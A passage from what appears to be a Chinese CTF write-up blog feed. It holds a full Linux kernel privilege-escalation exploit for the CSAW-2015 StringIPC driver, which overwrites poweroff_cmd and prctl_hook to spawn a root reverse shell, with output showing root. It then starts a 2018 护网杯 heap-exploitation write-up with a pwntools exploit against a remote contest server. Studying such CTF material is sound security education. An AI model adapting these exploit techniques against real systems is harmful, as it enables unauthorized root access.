class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>,*(<span class="keyword">char</span> *)(addr+i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"vdso:%lx\n"</span>, addr);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr,<span class="number">0x1000</span>,shellcode,<span class="built_in">strlen</span>(shellcode) ))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr ;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span> ;</span><br><span class="line"><span class="keyword">size_t</span> selinux_disable_addr= <span class="number">0x351c80</span>;</span><br><span class="line"><span class="keyword">size_t</span> prctl_hook = <span class="number">0xeb7df8</span>;</span><br><span class="line"><span class="keyword">size_t</span> order_cmd = <span class="number">0xe4dfa0</span>;</span><br><span class="line"><span class="keyword">size_t</span> poweroff_work_func_addr =<span class="number">0xa39c0</span>;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">"try2findmep4nda"</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] alloc_channel error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] now we get a channel %d\n"</span>,alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] we can read and write any momery"</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = addr<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line"><span class="keyword">if</span>(( !<span class="built_in">strcmp</span>(<span class="string">"gettimeofday"</span>,buf+<span class="number">0x2cd</span>)) )&#123; <span class="comment">// ((*(size_t *)(buf) == 0x00010102464c457f)) &amp;&amp; </span></span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found vdso %lx\n"</span>,result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found , try again "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_base = addr&amp;<span class="number">0xffffffffff000000</span>;</span><br><span class="line">selinux_disable_addr+= kernel_base;</span><br><span class="line">prctl_hook += kernel_base;</span><br><span class="line">order_cmd += kernel_base;</span><br><span class="line">poweroff_work_func_addr += kernel_base;</span><br><span class="line"><span class="comment">//size_t argv_0 = kernel_base + 0x117ed20;</span></span><br><span class="line"><span class="comment">//size_t mce_do_trigger_addr = kernel_base + 0x0422ba;</span></span><br><span class="line"><span class="comment">//size_t env = kernel_base + 0xe4df20;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found kernel base: %lx\n"</span>,kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found prctl_hook: %lx\n"</span>,prctl_hook);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found order_cmd : %lx\n"</span>,order_cmd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found selinux_disable_addr : %lx\n"</span>,selinux_disable_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found poweroff_work_func_addr: %lx\n"</span>,poweroff_work_func_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// change *poweroff_cmd - &gt; "/reverse_shll\0"</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'\0'</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="comment">//*(size_t *)buf = selinux_disable_addr;</span></span><br><span class="line"><span class="built_in">strcpy</span>(buf,<span class="string">"/reverse_shell\0"</span>);</span><br><span class="line"><span class="comment">//strcpy(buf,"/bin/chmod 777 /flag\0");</span></span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;<span class="comment">//&amp;cat_flag;</span></span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf);</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'\0'</span>,<span class="number">0x1000</span>);</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd+<span class="number">14</span><span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;<span class="comment">//&amp;cat_flag;</span></span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">memset(buf,'\0',0x1000);</span></span><br><span class="line"><span class="comment">*(size_t *)buf = 1 ;</span></span><br><span class="line"><span class="comment">//strcpy(buf,"/bin//sh\0");</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">seek_args.id =  alloc_args.id;</span></span><br><span class="line"><span class="comment">seek_args.index = kernel_base +  0x1380118-0x10 ;</span></span><br><span class="line"><span class="comment">seek_args.whence= SEEK_SET;</span></span><br><span class="line"><span class="comment">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span></span><br><span class="line"><span class="comment">write_args.id = alloc_args.id;</span></span><br><span class="line"><span class="comment">write_args.buf = buf;//&amp;cat_flag;</span></span><br><span class="line"><span class="comment">write_args.count = 20+1;</span></span><br><span class="line"><span class="comment">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// change *prctl_hook -&gt; reboot_work_func_addr</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'\0'</span>,<span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = prctl_hook<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;<span class="comment">//&amp;cat_flag;</span></span><br><span class="line">write_args.count = <span class="number">20</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// trag and get reverse shell</span></span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span> )&#123;</span><br><span class="line">prctl(addr,<span class="number">2</span>, addr,addr,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"nc -l -p 2333"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可以拿到root权限的反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> $ ./pwn</span><br><span class="line">[+] now we get a channel 1</span><br><span class="line">[+] we can <span class="built_in">read</span> and write any momery</span><br><span class="line">[+] found vdso ffffffff81e04000</span><br><span class="line">[+] found kernel base: ffffffff81000000</span><br><span class="line">[+] found prctl_hook: ffffffff81eb7df8</span><br><span class="line">[+] found order_cmd : ffffffff81e4dfa0</span><br><span class="line">[+] found selinux_disable_addr : ffffffff81351c80</span><br><span class="line">[+] found poweroff_work_func_addr: ffffffff810a39c0</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><p>最后感谢simp1e师傅的帮助，学到了很多东西。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>强网杯出题思路-solid_core: <a href="http://simp1e.leanote.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-solid_core" target="_blank" rel="noopener">http://simp1e.leanote.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-solid_core</a></p><p>Bypassing SMEP Using vDSO Overwrites：<a href="https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</a></p><p>linux kernel pwn notes: <a href="https://xz.aliyun.com/t/2306" target="_blank" rel="noopener">https://xz.aliyun.com/t/2306</a></p><p>idr 机制：<a href="http://blog.chinaunix.net/uid-21762157-id-4165782.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-21762157-id-4165782.html</a></p><p><a href="https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c" target="_blank" rel="noopener">https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c</a></p><p>给shellcode找块福地－通过VDSO绕过PXN:<a href="https://bbs.pediy.com/thread-220057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-220057.htm</a></p><p>New Reliable Android Kernel Root Exploitation Techniques：  <a href="http://t.cn/Rftu7Dn" target="_blank" rel="noopener">http://t.cn/Rftu7Dn</a></p>]]></content>
    
    <summary type="html">
    
      本篇主要以CSAW-2015-CTF的stringipc题目为例，分析了三种从内存任意读写到权限提升的利用方法。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="LINUX" scheme="http://p4nda.top/tags/LINUX/"/>
    
  </entry>
  
  <entry>
    <title>护网杯 CTF 2018线上预选赛PWN题解</title>
    <link href="http://p4nda.top/2018/10/14/hwb-ctf-2018/"/>
    <id>http://p4nda.top/2018/10/14/hwb-ctf-2018/</id>
    <published>2018-10-14T09:30:00.000Z</published>
    <updated>2018-10-14T10:53:38.352Z</updated>
    
    <content type="html"><![CDATA[<p>照例先放图：</p><p><img src="/img/hwb2018/0.png" alt=""></p><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><p>签到题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'117.78.40.144'</span>, <span class="number">32671</span>)</span><br><span class="line"><span class="comment">#p = process('task_gettingStart_ktQeERc')</span></span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3FB999999999999A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="shoppingcart"><a href="#shoppingcart" class="headerlink" title="shoppingcart"></a>shoppingcart</h2><h3 id="题目及漏洞分析"><a href="#题目及漏洞分析" class="headerlink" title="题目及漏洞分析"></a>题目及漏洞分析</h3><p>题目包含了两个结构体，money和good</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000 money           struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 name            dq ?</span><br><span class="line">00000008 sum             dq ?</span><br><span class="line">00000010 money           ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 good_chunk      struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 mem_ptr         dq ?</span><br><span class="line">00000008 sum             dq ?</span><br><span class="line">00000010 good_chunk      ends</span><br></pre></td></tr></table></figure><p>其中区别是money的name指向bss段，而good指向堆空间，二者的结构体都是通过malloc(0x10)得到的。</p><p>而在这个程序的bss段上，关于money_name、money_list、good_list的排布如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202090 bss_good_num    dq ?                    ; DATA XREF: add+17↑r</span><br><span class="line">.bss:0000000000202090                                         ; add+E1↑r ...</span><br><span class="line">.bss:0000000000202098 bss_num         dq ?                    ; DATA XREF: getmoney+8↑r</span><br><span class="line">.bss:00000000002020A0 ; char bss_name[160]</span><br><span class="line">.bss:00000000002020A0 bss_name        db 0A0h dup(?)          ; DATA XREF: getmoney+62↑o</span><br><span class="line">.bss:0000000000202140 bss_list        dd ?                    ; DATA XREF: </span><br><span class="line">.bss:00000000002021E0 ; void **bss_good_list[20]</span><br><span class="line">.bss:00000000002021E0 bss_good_list   dq 14h dup(?)           ; DATA XREF: add+FB↑o</span><br><span class="line">.bss:00000000002021E0                                         ; free_chunk+24↑o ...</span><br></pre></td></tr></table></figure><p>题目提供了对money的add功能。对good的add、edit、free功能。</p><p>而漏洞在于edit函数中，其中缺少对修改偏移的check，这个位置存在整数溢出漏洞。当可以找到一个位置满足题目中定义的这种链式结构就可以达到任意内存写。</p><p>并且可以注意到此处写0时存在一个null-off-by-one。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which goods you need to modify?"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x18</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = strtoul(&amp;s, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK, what would you like to modify %s to?\n"</span>, *bss_good_list[v0], v0);</span><br><span class="line">  *((_BYTE *)*bss_good_list[v1] + read(<span class="number">0</span>, *bss_good_list[v1], <span class="number">8u</span>LL)) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在add()函数中，当malloc(0)时，会返回一个0x20的块，并且向mem_ptr-1的位置，即size写入\0，而不影响堆块内存中原有的数据。这样当malloc(0)的堆块是从unsorted bin中分出来的，就存在脏数据来泄露libc地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// ST10_8</span></span><br><span class="line">  good_chunk *good_ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)bss_good_num &lt;= <span class="number">0x13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How long is your goods name?"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    size = strtoul(&amp;s, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    good_ptr = (good_chunk *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    good_ptr-&gt;sum = <span class="number">999L</span>L;</span><br><span class="line">    good_ptr-&gt;mem_ptr = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What is your goods name?"</span>);</span><br><span class="line">    *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)good_ptr-&gt;mem_ptr, size) - <span class="number">1L</span>L + good_ptr-&gt;mem_ptr) = <span class="number">0</span>;</span><br><span class="line">    v2 = bss_good_num++;</span><br><span class="line">    bss_good_list[v2] = (<span class="keyword">void</span> **)good_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your shopping cart is full now!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我想我这种利用方法大概是一种非预期（？），虽然很复杂。。</p><p>首先，将money填满（共20个），这样money_name和money_list两块就会相连，然后编辑最后一个money，会导致一位溢出，使得第一个money_list最低位被赋值为0，即堆空间指向低地址。</p><p>未覆盖前如下图：</p><p><img src="/img/hwb2018/1.png" alt=""></p><p>覆盖后如下图：</p><p><img src="/img/hwb2018/2.png" alt=""></p><p>而这块内存指向哪里呢？</p><p><img src="/img/hwb2018/3.png" alt=""></p><p>指向一个大小为0x1010的内存块里，这个内存块是什么呢？</p><p>由于题目中没有setvbuf，又用了fgets，这个内存块是stdin的缓冲区</p><p>如果对IO知识有一定了解就会知道，fgets并不是安装其参数的大小调用read函数，具体可以参考<a href="https://www.anquanke.com/post/id/86945" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86945</a></p><p>因此，如果我们在fgets时输入超长的字符串的话，不但可以控制程序执行流，还可以将money<em>list所指向的内存置为\</em>_free_hook，这样就可以将其劫持为system，在释放时可以触发system(“/bin/sh”)。</p><p>远程时，这个堆块并不是0x1010，调试这个大小花了很多功夫….所以我想应该算是一种非预期解法吧。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 